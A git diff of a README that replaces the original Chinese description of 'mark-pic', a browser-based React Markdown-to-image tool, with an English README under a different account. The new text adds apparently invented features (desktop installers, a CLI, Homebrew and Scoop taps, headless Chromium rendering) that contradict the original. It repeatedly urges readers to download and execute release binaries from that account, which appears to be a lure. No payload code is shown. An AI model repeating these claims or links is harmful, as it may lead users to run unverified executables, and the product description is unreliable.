@@ -1,144 +1,264 @@
-# mark-pic
+# Mark-Pic — Modern Markdown to Image Tool with Live Preview
 
-将 Markdown 文本转换为精美图片的在线工具。左边写 Markdown，右边实时生成图片。
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ahmedpracha/mark-pic/releases)
 
-## 📸 预览
+![hero](https://raw.githubusercontent.com/github/explore/main/topics/markdown/markdown.png)
 
-#### 电脑端
+Mark-Pic converts Markdown into high-quality images. It provides a real-time preview, flexible styling, and one-click export. Use it to share code snippets, notes, README sections, diagrams, and blog hero images.
 
-![mark-pic 应用预览](./docs/preview.png)
+Features
+- Live preview. See the rendered image as you type.
+- Custom styles. Choose fonts, themes, margins, and background.
+- Export formats. PNG, JPEG, and SVG.
+- High DPI exports for print and social media.
+- Built-in templates for code, blog headers, notes, and slides.
+- Command-line interface for automation and batch exports.
+- Clipboard copy and drag-and-drop support.
+- Local-first. Runs on your machine, no cloud required.
 
-![暗黑模式预览](./docs/dark-mode.png)
+Quick demo
+![demo-gif](https://raw.githubusercontent.com/ahmedpracha/mark-pic/main/assets/demo.gif)
 
-![样式设置面板](./docs/control-panel.jpg)
+Why use Mark-Pic
+- Create shareable visuals from Markdown.
+- Preserve syntax highlighting and layout.
+- Generate marketing, documentation, and tutorial images.
+- Automate image generation in CI or content pipelines.
 
+Install
 
-#### 移动端
+Download the release for your platform from the Releases page:
+https://github.com/ahmedpracha/mark-pic/releases
 
-![mark-pic 应用预览](./docs/mobile.jpg)
+Because the link includes a path, download the appropriate release file and execute it.
 
-![暗黑模式预览](./docs/dark-mobile.jpg)
+Linux
+- Download the AppImage or .tar.gz.
+- Make it executable and run:
+  chmod +x mark-pic-x.y.z.AppImage
+  ./mark-pic-x.y.z.AppImage
 
+macOS
+- Download the .dmg or .zip.
+- Open the .dmg and drag Mark-Pic to Applications.
+- Run Mark-Pic from Applications.
 
-### 支持 LaTeX Toc 时序图 等等
+Windows
+- Download the .exe installer.
+- Run the installer and follow the prompts.
+- Launch Mark-Pic from the Start menu.
 
-![图例](./docs/mark-pic-1754718268637.jpg)
+If the release link fails, check the Releases section on the repository page:
+https://github.com/ahmedpracha/mark-pic/releases
 
+CLI install
+- Homebrew (macOS/Linux):
+  brew tap ahmedpracha/mark-pic
+  brew install mark-pic
+- Scoop (Windows):
+  scoop bucket add mark-pic https://github.com/ahmedpracha/scoop-mark-pic
+  scoop install mark-pic
 
+Usage
 
-## ✨ 功能特性
+GUI mode
+- Open Mark-Pic.
+- Paste or write Markdown in the left editor.
+- See the rendered preview on the right.
+- Adjust style settings in the right panel.
+- Click Export to save a PNG, JPEG, or SVG.
 
-- 40+ 预设渐变背景，支持自定义渐变
-- 暗黑模式，跟随系统主题
-- Markdown 编辑器，支持语法高亮
-- 支持流程图、甘特图、时序图（Mermaid语法）
-- 支持 [toc] 目录和 LaTeX 数学公式
-- 美化的表格样式，带边框和悬停效果
-- 实时预览，所见即所得
-- 响应式设计，支持移动端
-- 图片下载和剪贴板复制
-- 可调整布局参数（宽度、边距、字体等）
-- 拖拽调整编辑器和预览区域比例
-- Toast 通知提示
+Common UI controls
+- Theme: light, dark, or custom CSS.
+- Font: system fonts and bundled web fonts.
+- Size: width, height, and device presets (Twitter, Instagram, Blog).
+- Scale: 1x, 2x, 3x for high DPI.
+- Padding and line-height controls.
 
-## 🚀 快速开始
+CLI mode
+- Convert a single file:
+  mark-pic convert README.md --out output.png
+- Batch convert:
+  mark-pic convert docs/*.md --out-dir images/
+- Set style from a JSON file:
+  mark-pic convert README.md --style styles/article.json --out article.png
+- Export SVG:
+  mark-pic convert diagram.md --format svg --out diagram.svg
+- Use templates:
+  mark-pic convert post.md --template hero --out hero.png
 
-环境要求：Node.js >= 18，pnpm >= 9
+CLI options
+- --out, -o: output file path
+- --format, -f: png | jpg | svg
+- --scale, -s: 1 | 2 | 3
+- --width, -w: output width in px
+- --height, -h: output height in px
+- --style: path to style JSON or CSS
+- --template: template name
+- --headless: run without opening GUI (useful in CI)
+- --watch: watch source files and regenerate on change
 
-```bash
-# 安装依赖
-pnpm install
+Styling and templates
 
-# 启动开发服务器
-pnpm dev
+Style file structure (JSON)
+{
+  "fontFamily": "Inter, Menlo, monospace",
+  "fontSize": 16,
+  "theme": "dark",
+  "background": "#0b1220",
+  "padding": 32,
+  "lineHeight": 1.6,
+  "codeStyle": {
+    "theme": "dracula",
+    "showLineNumbers": false
+  }
+}
 
-# 构建
-pnpm build
-```
+CSS support
+- You can pass a CSS file to control the final render.
+- Use CSS variables for colors and spacing.
+- Append custom fonts via @font-face.
 
-## 🛠️ 技术栈
+Built-in templates
+- code: compact code block with syntax highlight.
+- hero: large title, subtitle, and background.
+- note: compact note card with shadow.
+- slide: widescreen title slide.
 
-- **前端框架**: React 19 + TypeScript
-- **构建工具**: Vite
-- **样式框架**: TailwindCSS v4
-- **编辑器**: @uiw/react-md-editor
-- **Markdown 渲染**: react-markdown + remark-gfm
-- **图表渲染**: mermaid.js
-- **数学公式**: KaTeX
-- **目录生成**: remark-toc
-- **代码高亮**: react-syntax-highlighter
-- **图片生成**: html-to-image
-- **包管理器**: pnpm
+Examples
 
-## 📖 使用方法
+Create a blog hero
+1. Write a short Markdown file:
+   # How to write fast docs
+   _A practical guide to clear documentation._
+2. Use the hero template:
+   mark-pic convert hero.md --template hero --out hero.png --width 1600 --scale 2
 
-1. 左侧编辑器输入 Markdown 文本
-2. 右侧实时预览渲染效果
-3. 调整样式参数（背景、布局、字体等）
-4. 导出图片或复制到剪贴板
+Share a code snippet on social
+1. Copy code to snippet.md with triple backticks.
+2. Convert with code template:
+   mark-pic convert snippet.md --template code --out snippet.png --format png
 
-### 🎨 样式设置
+Automate in CI
+- Add a step in your CI pipeline:
+  - run: mark-pic convert README.md --out README-preview.png --headless
+- Commit the generated images to the site or release assets.
 
-- 背景：40+ 预设渐变 + 自定义渐变
-- 文本背景：独立设置文本内容的背景样式
-- 布局：卡片宽度 400-1200px，内外边距可调
-- 字体：大小 12-24px，行距 1.0-2.0
-- 界面：拖拽调整编辑器/预览区域比例
-- 图表：支持多种图表类型
-  - 流程图：使用 \```mermaid 或 \```flow
-  - 时序图：使用 \```sequence
-  - 甘特图：使用 \```mermaid 语法
-- 数学公式：使用 $...$ 或 $$...$$
-- 目录：使用 [toc] 标记自动生成
+Integration tips
+- Use the headless CLI in GitHub Actions to build hero images from post metadata.
+- Generate documentation badges and shareable snippets during build.
+- Combine with templating tools to create personalized social cards.
 
-## 🔧 开发
+Performance and formats
+- PNG for transparent backgrounds and pixel-accurate renders.
+- JPEG for photographic backgrounds and smaller files.
+- SVG for infinitely scalable vector text and shapes.
+- Use the --scale option for high-DPI exports.
 
-### 📁 项目结构
+Export presets
+- Twitter card: 1024x512
+- Blog header: 1600x900
+- Instagram post: 1080x1080
+- Slide: 1920x1080
 
-```
-src/
-├── components/          # React 组件
-│   ├── ControlPanel.tsx # 控制面板
-│   ├── ImagePreview.tsx # 图片预览
-│   ├── MarkdownEditor.tsx # Markdown 编辑器
-│   └── Toast.tsx        # 通知组件
-├── App.tsx             # 主应用组件
-├── index.css           # 全局样式
-└── main.tsx           # 应用入口
-```
+Example presets (CLI)
+mark-pic convert post.md --out post-twitter.png --width 1024 --height 512 --scale 2
 
-### 🧩 核心组件
+Accessibility
+- Exports preserve alt text for images embedded in Markdown.
+- You can add metadata and titles for SVG output.
 
-- **App.tsx**: 主应用逻辑，状态管理和布局控制
-- **MarkdownEditor.tsx**: Markdown 编辑器集成，支持折叠功能
-- **ImagePreview.tsx**: Markdown 渲染和图片导出
-- **ControlPanel.tsx**: 样式控制面板，背景和布局设置
-- **Toast.tsx**: 通知系统，替代原生 alert
+Troubleshooting
+- If fonts look wrong, ensure the font is installed or included via @font-face.
+- If images render blank, increase the timeout for external resources.
+- If the app fails to start after download, check permissions and try running from the terminal.
 
-### 📋 开发规范
+Releases and updates
 
-- 使用 TypeScript 严格模式
-- 遵循 React 19 最佳实践
-- 使用 TailwindCSS 进行样式开发
-- 组件化开发，保持单一职责
-- 完善的错误处理和用户体验
+Download the release file and execute it from the Releases page:
+https://github.com/ahmedpracha/mark-pic/releases
 
-## 📄 许可证
+Each release includes platform-specific binaries and checksums. Follow the release notes for breaking changes and upgrade steps.
 
-MIT License
+Security
+- Binaries are signed where supported.
+- Check checksums in the release notes.
+- Run headless mode in CI for deterministic builds.
 
-## 🤝 贡献
+Contributing
 
-欢迎提交 Issue 和 Pull Request！
+How to contribute
+- Fork the repo.
+- Create a feature branch.
+- Add tests or examples.
+- Open a pull request with a clear description.
 
-## 📞 联系
+Developer setup
+- Install Node.js 16+.
+- Install dependencies:
+  npm install
+- Run the app in dev mode:
+  npm run dev
+- Run tests:
+  npm test
 
-如有问题或建议，请通过 GitHub Issues 联系。
+Architecture overview
+- Renderer: converts HTML/CSS to image using headless Chromium.
+- Editor: Markdown editor with syntax highlight and live preview.
+- CLI: thin wrapper that exposes conversion and template options.
+- Templates: JSON + CSS that control layout and branding.
 
-## ☕ 赞赏支持
+Testing
+- Unit tests for parsing and options.
+- Visual tests for templates and export formats.
+- CI runs headless conversion and compares images to baselines.
 
-如果这个项目对你有帮助，欢迎请我喝杯咖啡 ☕
+License
+- MIT License. See LICENSE file.
 
-![赞赏码](./docs/reward-code.jpg)
+Acknowledgments
+- Uses headless Chromium for rendering.
+- Uses Prism or Shiki for code highlighting.
+- Uses open source fonts and icon sets.
 
-*"一杯咖啡，一声鼓励。"*
+Contact
+- Open issues and pull requests on the repository.
+- Report bugs with a minimal reproduction and the logs.
+
+Assets and images used in this README
+- Markdown icon: https://raw.githubusercontent.com/github/explore/main/topics/markdown/markdown.png
+- Demo GIF: assets/demo.gif (bundled with releases)
+- Badges: https://img.shields.io
+
+Badges
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ahmedpracha/mark-pic/releases)
+[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+
+Get the release file from the Releases page and run it:
+https://github.com/ahmedpracha/mark-pic/releases
+
+Contributors
+- Ahmed Pracha — initial work and maintainer
+- Community — templates, translations, and bug reports
+
+Project roadmap
+- Add cloud sync for team templates.
+- Add plugin system for custom renderers.
+- Improve mobile and tablet export presets.
+
+How to report bugs
+- Create an issue with steps to reproduce.
+- Attach the input Markdown and the used style or template.
+- Include the output image if possible.
+
+How to request features
+- Open an issue with a clear use case.
+- Provide a mock or sketch of the desired output.
+- Explain the expected workflow and CLI behavior.
+
+Licenses for bundled assets
+- Fonts and icons include proper attributions in the assets folder.
+- Check the releases for details on bundled asset licenses.
+
+Start using Mark-Pic now. Download the installer for your platform here:
+https://github.com/ahmedpracha/mark-pic/releases
